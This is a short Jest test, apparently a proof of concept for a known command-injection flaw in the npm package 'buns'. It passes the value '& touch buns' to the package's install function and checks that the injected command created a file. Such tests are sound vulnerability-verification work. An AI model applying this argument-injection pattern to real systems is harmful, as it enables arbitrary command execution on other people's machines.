//https://snyk.io/vuln/SNYK-JS-BUNS-1050389
test("Command Injection in buns", () => {
  var root = require("buns");
  const fs = require("fs");
  const path = "./buns";
  const sleep = require("sleep");
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  var name = "& touch buns";
  try {
    root.install(name);
  } catch (error) {
    console.log("error");
  }
  sleep.sleep(5);
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
